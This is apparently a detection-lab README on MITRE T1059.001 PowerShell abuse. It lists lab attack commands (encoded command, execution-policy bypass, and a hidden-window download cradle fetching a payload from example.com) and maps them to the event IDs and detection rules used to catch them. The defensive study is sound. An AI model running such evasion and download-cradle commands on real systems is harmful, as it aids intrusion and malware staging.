# T1059.001 — PowerShell Abuse

**Tactic:** Execution  
**MITRE Link:** https://attack.mitre.org/techniques/T1059/001/  
**Status:** ✅ Complete

---

## Why Attackers Use This

PowerShell is a built-in Windows administration tool, making it trusted by default and rarely blocked. Attackers abuse it to:
- Download and execute payloads directly in memory (fileless malware)
- Bypass execution policies using built-in flags (`-ExecutionPolicy Bypass`)
- Obfuscate commands using Base64 encoding (`-EncodedCommand`)
- Operate in hidden windows to avoid user visibility (`-WindowStyle Hidden`)
- Avoid leaving disk artifacts by running scripts entirely in memory

PowerShell is present in virtually every Windows environment, logs are disabled by default in many organizations, and it has direct access to the .NET framework and Windows APIs — making it a top choice for initial access payloads, C2 communication, and lateral movement staging.

**Real-world threat groups using this technique:** APT29, Lazarus Group, FIN7, Cobalt Strike operators.

---

## Attack Scenario

Simulating a threat actor who has gained initial foothold and uses PowerShell to:
1. Execute encoded commands to evade signature-based detection
2. Bypass execution policy to run unsigned scripts
3. Use a download cradle to stage a payload from a remote server
4. Run with hidden window and no profile to reduce noise

---

## Attack Commands Executed

```powershell
# Encoded command (Base64 obfuscation)
powershell -EncodedCommand JABjACAAPQAgACcASABlAGwAbABvACcA

# Execution policy bypass
powershell -ExecutionPolicy Bypass -Command "whoami"

# Hidden window + download cradle
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri http://example.com/payload.ps1"

# NoProfile + NonInteractive (common in malware droppers)
powershell -NoProfile -NonInteractive -Command "Get-Process"
```

---

## Logs Generated

See [logs-observed.md](./logs-observed.md) for raw log evidence from the lab.

| Log Source | Event ID | Description |
|------------|----------|-------------|
| PowerShell Operational | 4104 | Script block logging — captures full script content |
| PowerShell Operational | 4103 | Module logging — captures pipeline execution |
| Windows Security | 4688 | Process creation with command line arguments |
| Sysmon | 1 | Process create — captures full command line + parent process |

---

## Detection

- **Sigma Rule:** [sigma-rule.yml](./sigma-rule.yml)
- **Splunk SPL:** [splunk-spl.txt](./splunk-spl.txt)
- **Tuning Notes:** [tuning-notes.md](./tuning-notes.md)

---

## Screenshots

See [screenshots/](./screenshots/) for lab evidence.
